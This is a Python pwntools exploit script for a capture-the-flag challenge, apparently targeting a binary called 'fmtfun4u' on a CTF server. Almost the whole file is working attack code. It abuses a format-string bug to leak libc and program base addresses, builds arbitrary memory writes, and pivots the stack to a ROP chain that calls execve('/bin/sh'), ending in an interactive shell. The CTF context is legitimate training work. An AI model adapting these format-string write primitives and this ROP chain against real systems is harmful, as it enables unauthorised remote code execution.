# -*- coding: utf-8 -*- 
from pwn import *


#file decripter
#0  Standard input  stdin
#1  Standard output stdout
#2  Standard error  stderr

#
#   Arch:     amd64-64-little
#   RELRO:    Full RELRO
#   Stack:    No canary found
#   NX:       NX enabled
#   PIE:      PIE enabled
#   FORTIFY:  Enabled


buf_off = 0x201020
libc_off = 0x20830      #an address which pushed in __libc_start_main, is an addr in libc.
stack_off = 0x206d0     #an address in stack.(main frame)

#r = remote('127.0.0.1',8888)
r = remote('csie.ctf.tw',10136)

#main stack 往上算第三個是&argv
#0x7fffffffe5f8     -> 0x7fffffffe6c8 : &argv
#0x7fffffffe6c8     -> 0x7fffffffe8d8 : &argv[0] :./fmtfun4u
#0x7fffffffe6c8+0x8 -> 0x7fffffffe8f3 : &argv[1] :fuck

def fmt(pre,val,idx):
    padding_char_len = (val - pre) if val >  pre else (val - pre + 65536) 
    result = '%' + str(padding_char_len) + 'c%' + str(idx) + '$hn' 
    return result
def fmt_hhn(pre,val,idx):
    padding_char_len = (val - pre) if val >  pre else (val - pre + 256) 
    result = '%' + str(padding_char_len) + 'c%' + str(idx) + '$hhn' 
    return result
def change_lower_argv(off):
    #change &argv[0] lower 32 bit
    pay = fmt(0,off,11)
    #pay = '%' + str(off) + 'c%11$hn'
    if off == 0:
        pay = '%11$hn'
    r.send(pay.ljust(16,'\0'))

def set_i():
    clean_pipe()
    #set i to 10000 
    #r.interactive()
    r.send('argv:%11$p,%37$p')
    r.recvuntil('argv:')
    
    argv,argv0 = r.recvline().strip().split(',')
    argv = int( argv.ljust(8,'\0') ,0)
    argv0 = int( argv0.ljust(8,'\0') ,0)
    print '%s' % hex(argv)
    print '%s' % hex(argv0)
    #make $37 point to &i at $6
    i_addr = (argv % 0x10000) - 0xec
    pay = fmt(0,i_addr,11)
    r.send(pay.ljust(16,'\0'))
    #change i to 1000
    pay = fmt(0,10000,37)
    r.send(pay.ljust(16,'\0'))
    
    return argv,argv0
def set_higher_pointer(argv):
    #make $38/$39/$40/$41 point to higher 0/2/4/6 byte of &argv[0].
    #make it easier to access memory with given address.
    for j in range(4):
        for i in range(4):
            off = (argv+0x8*(j+1)+(i*2)) & 0xffff
            change_lower_argv(off)
            val = ( (argv + 0x2*j ) >> (i*16) ) & 0xffff
            #print hex(off),hex(val)
            pay = fmt(0,val,37).ljust(16,'\0')
            r.send(pay)
    #


def change_argv(addr):
    #each time wite hn, 4 bytes, to argv[0] 
    for i in range(4):
        idx = 38+i
        val = (addr >> (i*16) ) & 0xffff 
        pay = fmt(0,val,idx).ljust(16,'\0')
        r.send(pay)
        r.recvuntil(':')
def write(addr,val):
    for i in range(4):
        change_argv(addr + 0x2*i)
        v = (val >> (i*16)) & 0xffff
        pay = fmt(0,v,37).ljust(16,'\0')
        r.send(pay)
        r.recvuntil(':')
def leak_libc_base():
    clean_pipe()
    r.send('%9$p'.ljust(16,'\0'))
    r.recvuntil('0x')
    ret_libc = int( r.recv(12).ljust(8,'\0') ,16)
    libc = ret_libc - libc_off
    return libc 
def leak_text_base():
    r.send('%8$p'.ljust(16,'\0'))
    r.recvuntil('0x')
    text_off = 0xa80 
    rbp_libc = int( r.recv(12).ljust(8,'\0') ,16)
    text_base = rbp_libc - text_off
    return text_base 
def change_ret_main(argv,lower_2bytes):
    change_argv(argv - 0x100)
    val = lower_2bytes
    pay = fmt(0,val,37).ljust(16,'\0')
    r.send(pay)

def clean_pipe():
    sleep(0.1)
    r.recv(timeout = 0.1)
argv,argv0 = set_i()
set_higher_pointer(argv)
libc = leak_libc_base()
text = leak_text_base()

buf_off = 0x201600
buf_addr = text + buf_off

print 'libc base : %s\ntext base : %s' % (hex(libc),hex(text))
xor_eax = libc + 0x74f5f
pop_rax = libc + 0x33544
xor_esi = libc + 0xe8bde
pop_rdi = libc + 0x21102
pop_rdx = libc + 0x1b92
syscall = libc + 0xbc375

leave_off = 0x9af
leave_addr = text + leave_off
sys_addr = libc + 0x45390
sh_addr = libc + 0x18cd17

change_argv(0x123456)

low = leave_addr & 0xffff
print hex(leave_addr),hex(low)

#rsp at ret of main
rsp = argv - 0x100
#arbitrary rw memory
buf = argv + 0x200

#set rbp of libc
write(rsp +0x8*3,buf)#stack migration
#rop chain
print 'br'
write(buf,0x123456)
write(buf+0x8*1,pop_rdi)
write(buf+0x8*2,sh_addr)
write(buf+0x8*3,xor_eax)
write(buf+0x8*4,xor_esi)
write(buf+0x8*5,pop_rdx)
write(buf+0x8*6,0x0)
write(buf+0x8*7,pop_rax)
write(buf+0x8*8,0x3b)
write(buf+0x8*9,syscall)

#
write(rsp +0x8*4,leave_addr)

clean_pipe()

r.recvuntil(':')

change_ret_main(argv,low)

r.interactive()

